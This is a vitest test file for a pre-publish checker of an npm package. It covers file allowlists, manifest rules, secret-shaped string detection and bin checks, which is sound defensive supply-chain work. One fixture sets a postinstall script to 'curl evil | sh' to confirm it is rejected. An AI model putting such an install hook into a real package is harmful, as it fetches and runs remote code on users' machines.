// SPDX-License-Identifier: Apache-2.0
import { describe, expect, it } from 'vitest';
import { checkBin, checkFileList, checkManifest, EXPECTED_FILES, scanContent } from '../check-package.ts';

const goodManifest = {
  name: 'relic-bridge',
  version: '0.1.0',
  license: 'Apache-2.0',
  bin: { 'relic-bridge': './dist/index.mjs' },
  scripts: { build: 'tsdown' },
  dependencies: { zod: '4.6.5' },
  publishConfig: { access: 'public', provenance: true },
};

describe('checkFileList', () => {
  it('accepts exactly the allowlist', () => {
    expect(checkFileList([...EXPECTED_FILES].reverse())).toEqual([]);
  });

  it('flags extra and missing files', () => {
    const errors = checkFileList([
      'dist/index.mjs',
      'package.json',
      'LICENSE',
      'README.md',
      'test/a.test.ts',
    ]);
    expect(errors).toContain('unexpected file in tarball: test/a.test.ts');
    expect(errors).toContain('missing file in tarball: NOTICE');
  });
});

describe('checkManifest', () => {
  it('accepts the published manifest shape', () => {
    expect(checkManifest(goodManifest)).toEqual([]);
  });

  it('rejects install scripts, workspace ranges, internal deps and a wrong bin', () => {
    const errors = checkManifest({
      ...goodManifest,
      bin: { 'relic-bridge': './src/index.ts' },
      scripts: { postinstall: 'curl evil | sh' },
      dependencies: {
        '@relic-bridge/core': 'workspace:*',
        x: 'git+https://example.com/x.git',
        y: 'file:../y',
      },
    });
    expect(errors.some((e) => e.startsWith('bin must be'))).toBe(true);
    expect(errors).toContain('install-time script "postinstall" is not allowed');
    expect(errors.filter((e) => e.includes('non-registry range'))).toHaveLength(2);
    expect(errors.some((e) => e.includes('internal packages are bundled'))).toBe(true);
  });

  it('requires exact dependency versions (peer ranges are allowed)', () => {
    const errors = checkManifest({
      ...goodManifest,
      dependencies: {
        a: '^1.2.3',
        b: '~1.2.3',
        c: '1.x',
        d: 'latest',
        e: '>=1',
        f: '1.2.3-rc.1',
        g: '1.2.3',
      },
      optionalDependencies: { h: '*' },
      peerDependencies: { i: '^1.0.0' },
    });
    expect(errors.filter((e) => e.includes('not an exact version')).map((e) => e.split(' ')[0])).toEqual([
      'dependencies.a',
      'dependencies.b',
      'dependencies.c',
      'dependencies.d',
      'dependencies.e',
      'optionalDependencies.h',
    ]);
  });

  it('requires publishConfig access public and provenance', () => {
    const { publishConfig: _drop, ...bare } = goodManifest;
    expect(checkManifest(bare)).toEqual([
      'publishConfig.access must be "public"',
      'publishConfig.provenance must be true',
    ]);
    expect(
      checkManifest({ ...goodManifest, publishConfig: { access: 'restricted', provenance: false } }),
    ).toHaveLength(2);
  });

  it('rejects bundled dependencies', () => {
    expect(checkManifest({ ...goodManifest, bundledDependencies: ['zod'] })).toEqual([
      'bundledDependencies is not allowed: dependencies come from the registry',
    ]);
    expect(checkManifest({ ...goodManifest, bundleDependencies: true })).toHaveLength(1);
  });

  it('accepts main/exports that point at shipped files and rejects the rest', () => {
    expect(
      checkManifest({
        ...goodManifest,
        main: './dist/index.mjs',
        exports: { '.': { import: './dist/index.mjs' } },
      }),
    ).toEqual([]);
    const errors = checkManifest({
      ...goodManifest,
      main: './src/index.ts',
      exports: { '.': { import: './dist/missing.mjs', types: ['./dist/index.mjs'] } },
    });
    expect(errors).toEqual([
      'main points at a file that is not shipped: ./src/index.ts',
      'exports points at a file that is not shipped: ./dist/missing.mjs',
    ]);
  });

  it('rejects a private package, wrong name or license', () => {
    expect(checkManifest({ ...goodManifest, private: true, name: 'x', license: 'MIT' })).toHaveLength(3);
  });
});

describe('scanContent', () => {
  it('passes code that only mentions key prefixes', () => {
    expect(
      scanContent('dist/index.mjs', 'const re = /\\b(NRAK|NRAA)-[A-Za-z0-9_-]{8,}/g; "rb_" + x'),
    ).toEqual([]);
  });

  it('flags secret-shaped strings and local paths', () => {
    const key = `NRAK-${'A'.repeat(27)}`;
    expect(scanContent('a', `const k = "${key}"`)).toEqual(['a: contains a New Relic key-shaped string']);
    expect(scanContent('a', `x rb_live_${'b'.repeat(20)}`)).toEqual([
      'a: contains a relic-bridge token-shaped string',
    ]);
    expect(scanContent('a', `-----BEGIN RSA PRIVATE KEY-----`)).toEqual([
      'a: contains a private key-shaped string',
    ]);
    expect(scanContent('a', '//# sourceMappingURL=/home/dev/repo/x.map')).toEqual([
      'a: contains an absolute local path',
    ]);
  });
});

describe('scanContent: P8-07 patterns', () => {
  const labels = (text: string): string[] =>
    scanContent('a', text).map((e) => e.replace(/^a: contains an? /, '').replace(/-shaped string$/, ''));

  it('flags New Relic license keys, master keys, AWS and Cloudflare tokens', () => {
    expect(labels(`k = "${'a1'.repeat(20)}NRAL"`)).toEqual(['New Relic license key']);
    const b64 = `${'A'.repeat(43)}=`;
    expect(labels(`RB_MASTER_KEY=${b64}`)).toEqual(['master key']);
    expect(labels(`RB_MASTER_KEY_PREVIOUS: "v2:${b64}"`)).toEqual(['master key']);
    expect(labels(`id AKIA${'B'.repeat(16)}`)).toEqual(['AWS access key id']);
    expect(labels(`aws_secret_access_key = ${'c'.repeat(40)}`)).toEqual(['AWS secret access key']);
    expect(labels(`cfut_${'d'.repeat(40)}`)).toEqual(['Cloudflare token']);
    expect(labels(`CLOUDFLARE_API_TOKEN="${'e'.repeat(40)}"`)).toEqual(['Cloudflare token']);
    expect(labels(`X-Auth-Key: ${'f'.repeat(37)}`)).toEqual(['Cloudflare global API key']);
  });

  it('does not flag names, docs and look-alikes', () => {
    expect(labels('process.env.RB_MASTER_KEY; "RB_MASTER_KEY is not set"')).toEqual([]);
    expect(labels('RB_MASTER_KEY=<base64>')).toEqual([]);
    expect(labels(`${'a'.repeat(39)}NRAL ${'a'.repeat(41)}NRAL`)).toEqual([]);
    expect(labels('AKIA is the prefix; ASIAxyz; cfut_short')).toEqual([]);
    expect(labels('CLOUDFLARE_API_TOKEN is required; X-Auth-Key header')).toEqual([]);
  });

  it('flags Windows home paths (one or two backslashes) and /root/, not words ending in root', () => {
    // Plain text has one backslash; in a bundled source file they are doubled.
    expect(labels(String.raw`C:\Users\dev\repo`)).toEqual(['absolute local path']);
    expect(labels(String.raw`C:\\Users\\dev\\repo`)).toEqual(['absolute local path']);
    expect(scanContent('a', 'cd /root/project')).toHaveLength(1);
    expect(scanContent('a', 'x = "/root/"')).toHaveLength(1);
    expect(scanContent('a', 'import x from "./root/y"; path.join(webroot/, "a"); /sub/root/x')).toEqual([]);
    expect(scanContent('a', 'C:\\Users\\<name>\\')).toEqual([]);
  });
});

describe('checkBin', () => {
  it('needs a node shebang and the executable bit', () => {
    expect(checkBin('#!/usr/bin/env node\nimport x', 0o755)).toEqual([]);
    expect(checkBin('import x', 0o644)).toHaveLength(2);
  });
});
